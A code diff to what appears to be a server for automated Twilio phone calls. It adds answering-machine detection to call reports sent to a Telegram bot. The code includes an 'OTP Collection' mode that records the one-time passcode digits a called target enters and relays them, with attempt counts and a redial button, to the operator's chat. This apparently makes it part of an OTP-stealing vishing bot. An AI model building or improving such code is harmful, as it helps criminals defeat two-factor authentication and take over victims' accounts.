@@ -26630,12 +26630,21 @@ app.post('/twilio/single-ivr-otp-hold', async (req, res) => {
 app.post('/twilio/single-ivr-status', async (req, res) => {
   try {
     const { sessionId } = req.query
-    const { CallSid, CallStatus, CallDuration } = req.body || {}
+    const { CallSid, CallStatus, CallDuration, AnsweredBy } = req.body || {}
     const duration = parseInt(CallDuration || '0')
     const voiceService = require('./voice-service.js')
     const session = voiceService.twilioIvrSessions[sessionId]
 
-    log(`[SingleIVR] Status: session=${sessionId} sid=${CallSid} status=${CallStatus} duration=${duration}s`)
+    // Capture AMD result from Twilio (AnsweredBy: human, machine_start, machine_end_beep, etc.)
+    if (session && AnsweredBy) {
+      session.answeredBy = AnsweredBy.startsWith('machine') ? 'machine'
+        : AnsweredBy === 'human' ? 'human'
+        : AnsweredBy === 'fax' ? 'fax'
+        : 'unknown'
+      log(`[SingleIVR] AMD: session=${sessionId} AnsweredBy=${AnsweredBy} → ${session.answeredBy}`)
+    }
+
+    log(`[SingleIVR] Status: session=${sessionId} sid=${CallSid} status=${CallStatus} duration=${duration}s${AnsweredBy ? ' answeredBy=' + AnsweredBy : ''}`)
 
     if (session && CallStatus === 'completed') {
       const durationStr = duration > 0 ? `${Math.ceil(duration / 60)} min` : 'brief'
@@ -26674,22 +26683,28 @@ app.post('/twilio/single-ivr-status', async (req, res) => {
         }
       } catch (e) { /* no redial button on error */ }
 
+      // AMD detection line for Twilio calls
+      const amdLine = session.answeredBy === 'human' ? '\n👤 <b>Human Answered</b>'
+        : session.answeredBy === 'machine' ? '\n📬 <b>Voicemail Detected</b>'
+        : session.answeredBy === 'fax' ? '\n📠 <b>Fax Machine</b>'
+        : ''
+
       // OTP mode completion report
       if (session.ivrMode === 'otp_collect') {
         const otpResult = session.otpStatus === 'confirmed' ? '✅ Confirmed' : session.otpStatus === 'rejected' ? '❌ Rejected' : session.otpStatus === 'timeout' ? '⏰ Timed Out' : '—'
         bot?.sendMessage(session.chatId,
-          `📊 <b>OTP Call Complete</b>\n📞 ${session.targetNumber}\n🔑 Mode: OTP Collection\n🔢 Last Code: <code>${session.otpDigits || 'None'}</code>\n📊 Result: ${otpResult}\n🔄 Attempts: ${session.otpAttempt || 0}/${session.otpMaxAttempts || 3}\n⏱️ Duration: ${durationStr}`,
+          `📊 <b>OTP Call Complete</b>\n📞 ${session.targetNumber}${amdLine}\n🔑 Mode: OTP Collection\n🔢 Last Code: <code>${session.otpDigits || 'None'}</code>\n📊 Result: ${otpResult}\n🔄 Attempts: ${session.otpAttempt || 0}/${session.otpMaxAttempts || 3}\n⏱️ Duration: ${durationStr}`,
           { parse_mode: 'HTML', ...redialKeyboard }
         ).catch(() => {})
       } else if (session.digitPressed) {
         bot?.sendMessage(session.chatId,
-          `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}\n🔢 Pressed: <b>${session.digitPressed}</b>\n⏱️ Duration: ${durationStr}${session.phase === 'transferring' ? '\n🔗 Transferred to ' + session.ivrNumber : ''}`,
+          `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}${amdLine}\n🔢 Pressed: <b>${session.digitPressed}</b>\n⏱️ Duration: ${durationStr}${session.phase === 'transferring' ? '\n🔗 Transferred to ' + session.ivrNumber : ''}`,
           { parse_mode: 'HTML', ...redialKeyboard }
         ).catch(() => {})
       } else {
         const reason = session.phase === 'playing' ? 'No key pressed' : 'Not answered'
         bot?.sendMessage(session.chatId,
-          `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}\n❌ ${reason}\n⏱️ Duration: ${durationStr}`,
+          `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}${amdLine}\n❌ ${reason}\n⏱️ Duration: ${durationStr}`,
           { parse_mode: 'HTML', ...redialKeyboard }
         ).catch(() => {})
       }
